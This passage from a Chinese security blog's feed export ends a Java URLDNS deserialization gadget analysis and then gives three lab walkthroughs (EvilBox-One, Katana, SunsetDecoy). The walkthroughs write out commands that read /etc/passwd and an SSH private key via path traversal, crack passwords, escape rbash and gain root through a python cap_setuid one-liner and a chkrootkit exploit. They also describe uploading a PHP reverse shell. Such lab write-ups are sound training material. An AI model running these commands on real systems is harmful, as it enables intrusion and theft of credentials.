class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>            <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在41行的位置可以找到<code>HashMap</code>的键名计算了hash：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>在这里下断点，对<code>hash</code>函数进行调试并且跟进，这是调用栈：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230601141759386.png" alt="image-20230601141759386"></p><p><code>putVal</code>方法调用了<code>hash</code>方法，而<code>hash</code>方法调用了<code>key</code>的<code>hashcode</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>URLDNS中使⽤的这个key是⼀个<code>java.net.URL</code>对象，我们看看其<code>hashCode</code>方法</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230601144030315.png" alt="image-20230601144030315"></p><p>此时，<code>handler</code>是<code>URLStreamHandler</code>对象（的某个子类对象），继续跟进其<code>hashCode</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Generate the protocol part.</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>    <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>        h += protocol.hashCode();<br><br>    <span class="hljs-comment">// Generate the host part.</span><br>    <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>    <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>        h += addr.hashCode();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>        <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>            h += host.toLowerCase().hashCode();<br>    &#125;<br><br>    <span class="hljs-comment">// Generate the file part.</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>        h += file.hashCode();<br><br>    <span class="hljs-comment">// Generate the port part.</span><br>    <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>        h += getDefaultPort();<br>    <span class="hljs-keyword">else</span><br>        h += u.getPort();<br><br>    <span class="hljs-comment">// Generate the ref part.</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>    <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>        h += ref.hashCode();<br><br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里有调用<code>getHostAddress</code>方法，继续跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hostAddress != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> hostAddress;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.isEmpty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        hostAddress = InetAddress.getByName(host);<br>    &#125; <span class="hljs-keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> hostAddress;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>InetAddress.getByName(host)</code>的作用就是根据主机名，获取其ip地址，在网络上的意思就是一次dns请求。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230601144820572.png" alt="image-20230601144820572"></p><p>至此，整个<code>URLDNS</code>的Gadget已经清晰表现出来了</p><ol><li><code>HashMap --&gt; readObject()</code></li><li><code>HashMap --&gt; hash()</code></li><li><code>URL --&gt; hashCode()</code></li><li><code>URLStreamHandler --&gt; hashcode()</code></li><li><code>URLStreamHandler --&gt; getHostAddress()</code></li><li><code>InetAddress --&gt; getByName()</code></li></ol><p>从反序列化最开始的<code>readObject</code>到最后触发DNS请求的<code>getHostAddress</code>，只经过了6个函数的调用，这在Java中其实已经算很少了。</p><p>要构造这个Gadget，只需要初始化一个<code>java.net.URL</code>对象，作为<code>key</code>放在<code>java.util.HashMap</code>中；然后设置这个<code>URL</code>对象的<code>hashCode</code>为初始值<code>-1</code>，这样反序列化将会重新计算其<code>hashCode</code>，才能触发到后面的DNS请求，否则不会调用<code>URL-&gt;hashCode()</code></p><h3 id="5-reference"><a href="#5-reference" class="headerlink" title="5. reference"></a>5. reference</h3><h5 id="Triggering-a-DNS-lookup-using-Java-Deserialization"><a href="#Triggering-a-DNS-lookup-using-Java-Deserialization" class="headerlink" title="Triggering a DNS lookup using Java Deserialization"></a>Triggering a DNS lookup using Java Deserialization</h5><p><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p><h5 id="Java安全漫谈"><a href="#Java安全漫谈" class="headerlink" title="Java安全漫谈"></a>Java安全漫谈</h5><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524">https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EvilBox-One Walkthrouth</title>
    <link href="/2023/05/04/EvilBox-One-Walkthrouth/"/>
    <url>/2023/05/04/EvilBox-One-Walkthrouth/</url>
    
    <content type="html"><![CDATA[<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504112734339.png" alt="image-20230504112734339"></p><p>明显的web站，需要web渗透</p><h5 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504112758541.png" alt="image-20230504112758541"></p><h4 id="2-简单漏扫"><a href="#2-简单漏扫" class="headerlink" title="2. 简单漏扫"></a>2. 简单漏扫</h4><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504112844075.png" alt="image-20230504112844075"></p><h4 id="3-Web信息收集"><a href="#3-Web信息收集" class="headerlink" title="3. Web信息收集"></a>3. Web信息收集</h4><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504112927203.png" alt="image-20230504112927203"></p><p>访问robots.txt提醒我存在一个用户H4x0r</p><h4 id="4-目录枚举"><a href="#4-目录枚举" class="headerlink" title="4. 目录枚举"></a>4. 目录枚举</h4><p>通过前面枚举出的&#x2F;secret目录，开始对这个目录进行枚举</p><p><code>feroxbuster -u http://192.168.204.212/secret/ -x php,txt,html --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504113152318.png" alt="image-20230504113152318"></p><p>这里枚举出来一个evil.php文件，但是很搞的是，这个php文件没有返回数据，在枚举了一段时间没结果后，只能考虑fuzz参数了。</p><h4 id="5-fuzz参数"><a href="#5-fuzz参数" class="headerlink" title="5. fuzz参数"></a>5. fuzz参数</h4><p><code>wfuzz -c -w **/usr/share/wfuzz/wordlist/general/common.txt** --hc 404 -u &quot;http://192.168.204.212/secret/evil.php?FUZZ=../../../../../../etc/passwd&quot; --hw 0 </code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504114939703.png" alt="image-20230504114939703"></p><p>发现一个任意文件读取漏洞的存在</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504115023308.png" alt="image-20230504115023308"></p><h4 id="6-任意文件读取"><a href="#6-任意文件读取" class="headerlink" title="6. 任意文件读取"></a>6. 任意文件读取</h4><p>这里从所用用户中发现mowree可能存在有意思的信息</p><p>尝试读了一下history发现没什么东西，在ssh目录下发现存在私钥</p><p><code>curl http://192.168.204.212/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504115248562.png" alt="image-20230504115248562"></p><p>居然还存在authorized_keys</p><p>那思路明确了，私钥ssh登录mowree账户</p><h4 id="7-ssh攻击"><a href="#7-ssh攻击" class="headerlink" title="7. ssh攻击"></a>7. ssh攻击</h4><p>直接尝试用私钥认证的方式登录居然失败了，需要密码</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504115738502.png" alt="image-20230504115738502"></p><p>私钥我都有的话，可以考虑密码破解</p><h4 id="8-密码攻击"><a href="#8-密码攻击" class="headerlink" title="8. 密码攻击"></a>8. 密码攻击</h4><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504120027413.png" alt="image-20230504120027413"></p><p>爆破成功后带上私钥登录</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504120143390.png" alt="image-20230504120143390"></p><p>成功获取到shell</p><h4 id="9-权限提升"><a href="#9-权限提升" class="headerlink" title="9. 权限提升"></a>9. 权限提升</h4><p>直接<a href="https://github.com/carlospolop/PEASS-ng/releases/download/20230425-bd7331ea/linpeas.sh">linpeas.sh</a>梭哈</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504121029407.png" alt="image-20230504121029407"></p><p>&#x2F;etc&#x2F;passwd可写</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504121157090.png" alt="image-20230504121157090"></p><p>rooted!</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504121354671.png" alt="image-20230504121354671"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230504121437871.png" alt="image-20230504121437871"></p><h4 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h4><p>简单靶机，有意思的点在于参数模糊测试，这个我在实战中用的比较少，虽然想到了但是我还是参考了之前的笔记，这个命令对于日常工作得用起来，说不定哪个参数就存在漏洞呢。</p><p>关于任意文件读取，可以参考seclists整理的以下两个字典</p><p>Linux</p><p><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt">LFI-gracefulsecurity-linux.txt</a></p><p>Windows</p><p><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt">LFI-gracefulsecurity-windows.txt</a></p><p>这次提权因为pg时间没多少了，我就没自己手工搞了，直接用脚本跑了一遍</p><p>很简单的&#x2F;etc&#x2F;passwd可写入漏洞</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Katana Walkthrouth</title>
    <link href="/2023/05/03/Katana-Walkthrouth/"/>
    <url>/2023/05/03/Katana-Walkthrouth/</url>
    
    <content type="html"><![CDATA[<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503112059637.png" alt="image-20230503112059637"></p><p>目标存在着21,22,80,8088,8715端口</p><h5 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503112139472.png" alt="image-20230503112139472"></p><p>很难受的是，这次使用默认漏扫扫了半小时没出结果，放弃了，手搓吧</p><h4 id="2-Web信息收集"><a href="#2-Web信息收集" class="headerlink" title="2. Web信息收集"></a>2. Web信息收集</h4><p>通过访问80, 8088, 8715这三个http服务，并没有什么收获，都是一张武士刀的图片</p><p>其中8715端口使用了basic http验证，通过admin:admin成功进入</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503112943199.png" alt="image-20230503112943199"></p><h4 id="3-ftp攻击"><a href="#3-ftp攻击" class="headerlink" title="3. ftp攻击"></a>3. ftp攻击</h4><p>对于ftp服务，不存在匿名登录的选项</p><p>并且尝试使用admin:admin登录，发现失败了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503113036317.png" alt="image-20230503113036317"></p><h4 id="4-目录枚举"><a href="#4-目录枚举" class="headerlink" title="4. 目录枚举"></a>4. 目录枚举</h4><p>对80, 8088, 8715端口分别进行目录枚举</p><p>80端口没什么东西</p><p>8088存在一个&#x2F;upload.php以及&#x2F;docs</p><p>8715也没发现有意思的东西</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503114013573.png" alt="image-20230503114013573"></p><h4 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h4><p>在<code>http://192.168.210.83:8088/upload.html</code>上传一个反弹shell的php文件</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503115116223.png" alt="image-20230503115116223"></p><p>开启监听，尝试访问，发现在8088, 80端口均404</p><p>但是在8715端口访问发现成功了</p><p><code>http://192.168.210.83:8715/katana_php-reverse-shell.php</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503115325543.png" alt="image-20230503115325543"></p><h4 id="6-权限提升"><a href="#6-权限提升" class="headerlink" title="6. 权限提升"></a>6. 权限提升</h4><p>在&#x2F;var&#x2F;www目录下发现第一个flag</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503115616403.png" alt="image-20230503115616403"></p><p>准备开始权限提升</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503115734166.png" alt="image-20230503115734166"></p><p>随便看了下&#x2F;etc&#x2F;passwd发现存在bash环境的用户密码都写在里面..</p><p>可以考虑尝试密码攻击了</p><h5 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503122308914.png" alt="image-20230503122308914"></p><p>爆破了半天没出结果，放弃了，后来发现可以特殊文件能力进行提权..</p><h5 id="cap-setuid-ep提权"><a href="#cap-setuid-ep提权" class="headerlink" title="cap_setuid+ep提权"></a>cap_setuid+ep提权</h5><p>通过linpeas发现</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503125652673.png" alt="image-20230503125652673"></p><p><code>getcap -r / 2&gt;/dev/null</code></p><p><code>/usr/bin/python2.7 -c &quot;import os;os.setuid(0);os.system(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503122335158.png" alt="image-20230503122335158"></p><p><code>cap_setuid+ep</code> 表示 <code>/usr/bin/python2.7</code> 文件还具有一个称为 “文件特殊能力”（File Capabilities）的特性。其中，<code>cap_setuid</code> 是一种文件特殊能力，它允许该文件在不具备超级用户权限的情况下，使用 <code>setuid()</code> 系统调用来设置进程的用户 ID。这样可以允许 <code>/usr/bin/python2.7</code> 文件在以 <code>root</code> 用户身份运行时，使用 <code>setuid()</code> 系统调用将进程的用户 ID 设置为其他普通用户，从而限制该进程的权限，提高安全性。</p><h4 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h4><p>简单靶机，通过简单的信息收集和文件上传漏洞的利用就能getshell。</p><p>对于权限提升，通过suid我并没有能找到可以利用文件</p><p>但是通过这次学到了File Capabilities提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.setuid(<span class="hljs-number">0</span>)<br>os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br></code></pre></td></tr></table></figure><p>尽管python没有suid权限，但是它却可以设置suid，也就是说我可以利用它把我设置成root的uid，再用这个uid拿到的shell就是root权限了。</p><p>这里附上从gpt中找到的回答</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230503130013127.png" alt="image-20230503130013127"></p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SunsetDecoy Walkthrouth</title>
    <link href="/2023/05/02/SunsetDecoy-Walkthrouth/"/>
    <url>/2023/05/02/SunsetDecoy-Walkthrouth/</url>
    
    <content type="html"><![CDATA[<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><p>目标IP为192.168.204.85</p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p><code>nmap -p- 192.168.204.85 --min-rate=2000</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502121958180.png" alt="image-20230502121958180"></p><p>目标很明显是个web站，仅开放了22和80端口</p><h5 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h5><p><code>sudo nmap -p22,80 192.168.204.85 -sV -sC -O -sT</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502122058807.png" alt="image-20230502122058807"></p><h4 id="2-简单漏扫"><a href="#2-简单漏扫" class="headerlink" title="2. 简单漏扫"></a>2. 简单漏扫</h4><p>按照惯例，进行一次nmap的默认脚本的简单扫描</p><p><code>sudo nmap -p22,80 192.168.204.85 --script=vuln</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502122309654.png" alt="image-20230502122309654"></p><p>有惊喜啊，直接扫出来sql注入</p><p>对于默认的web页面发现是个目录遍历，存在一个save.zip文件</p><p>打开后发现它存在密码</p><h4 id="3-密码攻击"><a href="#3-密码攻击" class="headerlink" title="3. 密码攻击"></a>3. 密码攻击</h4><p>直接用john</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip2john save.zip &gt; <span class="hljs-built_in">hash</span><br><span class="hljs-built_in">cp</span> /usr/share/wordlists/rockyou.txt.gz ./<br>gunzip rockyou.txt.gz<br>john <span class="hljs-built_in">hash</span> --wordlist=./rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502122833046.png" alt="image-20230502122833046"></p><p>成功破解密码为<code>manuel</code></p><p>解压出来一个&#x2F;etc的目录，看起来像是某个用户的配置文件 盲猜一手<code>manuel</code>就是用户名</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502123124436.png" alt="image-20230502123124436"></p><p>很明显我猜错了，倒是存在一个很复杂的用户<code>296640a3b825115a47b68fc44501c828</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502123243279.png" alt="image-20230502123243279"></p><p>shadow文件也存在，那我直接继续破解密码</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502124432958.png" alt="image-20230502124432958"></p><p>296640a3b825115a47b68fc44501c828:server</p><h4 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4. ssh登录"></a>4. ssh登录</h4><p>直接通过上面破解的密码居然登录成功了..那我还找个锤子sql注入</p><p>后面细看了一下发现应该是误报</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502124804251.png" alt="image-20230502124804251"></p><h4 id="5-rbash绕过"><a href="#5-rbash绕过" class="headerlink" title="5. rbash绕过"></a>5. rbash绕过</h4><p>登录之后发现很多命令都用不了，回想起来这个是一个rbash的环境</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502125234609.png" alt="image-20230502125234609"></p><p>参考了一下<a href="https://cloud.tencent.com/developer/article/1680551">RBash - 受限的Bash绕过</a></p><p>看了下似乎只有当前目录下的这些命令可以执行</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502125553535.png" alt="image-20230502125553535"></p><p>使用下面命令重新登录</p><p><code>ssh 296640a3b825115a47b68fc44501c828@192.168.174.85 -t &quot;bash --noprofile&quot;</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502130045480.png" alt="image-20230502130045480"></p><p>这样进入是bash环境了</p><p>将&#x2F;bin &#x2F;usr&#x2F;bin加入到环境变量中应该就可以正常使用这个bash了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin<br></code></pre></td></tr></table></figure><p>成功读到第一个flag！</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502130250631.png" alt="image-20230502130250631"></p><h4 id="6-权限提升"><a href="#6-权限提升" class="headerlink" title="6. 权限提升"></a>6. 权限提升</h4><p>既然可以正常使用bash了，那就可以考虑提权了</p><p>尝试了正常思路提权发现没起效果，在当前用户目录下发现一个奇怪的二进制文件</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502193724753.png" alt="image-20230502193724753"></p><p>运行5后提醒我AV Scan将在一分钟以内执行，推测是定时任务</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502193817731.png" alt="image-20230502193817731"></p><p>尝试找了下定时任务发现没什么收获</p><p>最后看了看hint，发现有办法在没root权限的情况下拿到Linux进程执行列表（实时更新的）</p><p>来到这个工具下<a href="https://github.com/DominicBreuker/pspy%EF%BC%88About">https://github.com/DominicBreuker/pspy（About</a></p><p>Monitor linux processes without root permissions）</p><p>通过它我可以清楚的发现当我执行5后会循环执行下面的二进制文件</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502194026790.png" alt="image-20230502194026790"></p><p>通过简单搜索，它将我带入了<a href="https://www.exploit-db.com/exploits/33899%EF%BC%88Chkrootkit">https://www.exploit-db.com/exploits/33899（Chkrootkit</a> 0.49 - Local Privilege Escalation）本地提权漏洞</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">Steps <span class="hljs-keyword">to</span> reproduce:<br><br>- Put <span class="hljs-keyword">an</span> <span class="hljs-built_in">executable</span> <span class="hljs-keyword">file</span> named <span class="hljs-string">&#x27;update&#x27;</span> with non-root owner in /tmp (not<br>mounted noexec, obviously)<br>- Run chkrootkit (<span class="hljs-keyword">as</span> uid <span class="hljs-number">0</span>)<br><br>Result: The <span class="hljs-keyword">file</span> /tmp/<span class="hljs-keyword">update</span> will <span class="hljs-keyword">be</span> executed <span class="hljs-keyword">as</span> root, thus effectively<br>rooting your box, <span class="hljs-keyword">if</span> malicious content <span class="hljs-keyword">is</span> placed inside the <span class="hljs-keyword">file</span>.<br><br>If <span class="hljs-keyword">an</span> attacker knows you are periodically running chkrootkit (like in<br>cron.daily) <span class="hljs-built_in">and</span> <span class="hljs-built_in">has</span> <span class="hljs-keyword">write</span> access <span class="hljs-keyword">to</span> /tmp (not mounted noexec), he may<br>easily take advantage of this.<br></code></pre></td></tr></table></figure><p>这个exp告诉我，叫我在&#x2F;tmp目录下以一个非root用户创建一个叫做update的二进制文件，如果chkrootkit以root权限运行的话，&#x2F;tmp&#x2F;update将会以root权限运行。</p><p>这意味着我完全可以通过我写的这个文件重新弹一个shell到我主机上</p><p>打到这我vpn断了，得了又得重来</p><p>往&#x2F;tmp&#x2F;update写入反弹shell的命令</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502200719918.png" alt="image-20230502200719918"></p><p>设置监听，启动AV Scan</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502200842308.png" alt="image-20230502200842308"></p><p>等了一段时间发现没东西啊</p><p>后来细修改了一下 